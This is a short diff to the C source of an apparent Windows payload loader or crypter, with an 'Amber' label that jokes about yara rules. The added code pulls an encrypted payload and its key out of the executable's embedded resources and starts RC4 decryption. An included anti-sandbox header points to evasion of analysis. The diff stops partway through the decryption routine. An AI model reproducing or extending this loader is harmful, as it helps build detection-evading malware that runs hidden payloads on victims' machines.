@@ -1,7 +1,5 @@
 #include <windows.h>
 #include "AntiSandbox.h"
-#include "payload.h"
-#include "key.h"
 #include "RC4.h"
 
 const char LABEL[] = {"<Amber:27a01d4772038a3f83552908e0470604e773f8af>"}; // Descriptive label for yara rules ;D
@@ -19,11 +17,21 @@ int main(int argc, char const *argv[])
 
 void ExecutePayload(){
 
-/*
-	for(int i = 0; i < sizeof(Payload); i++) {
-		Payload[i] = (Payload[i] ^ Payload_key[(i%sizeof(Payload_key))]);
-	}	
-*/
+	unsigned char * Payload;
+	unsigned int Payload_len;
+	unsigned char * Payload_key;
+	unsigned int Payload_key_len;
+	
+
+	HRSRC hRsrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(0), RT_RCDATA);
+	HGLOBAL hGlob = LoadResource(GetModuleHandle(NULL), hRsrc);
+	Payload = (unsigned char*)LockResource(hGlob);
+	Payload_len = (unsigned int)SizeofResource(GetModuleHandle(NULL), hRsrc);
+
+	hRsrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(1), RT_RCDATA);
+	hGlob = LoadResource(GetModuleHandle(NULL), hRsrc);
+	Payload_key = (unsigned char*)LockResource(hGlob);
+	Payload_key_len = (unsigned int)SizeofResource(GetModuleHandle(NULL), hRsrc);
 
 	unsigned char S[N];
     KSA(Payload_key,Payload_key_len,S);	
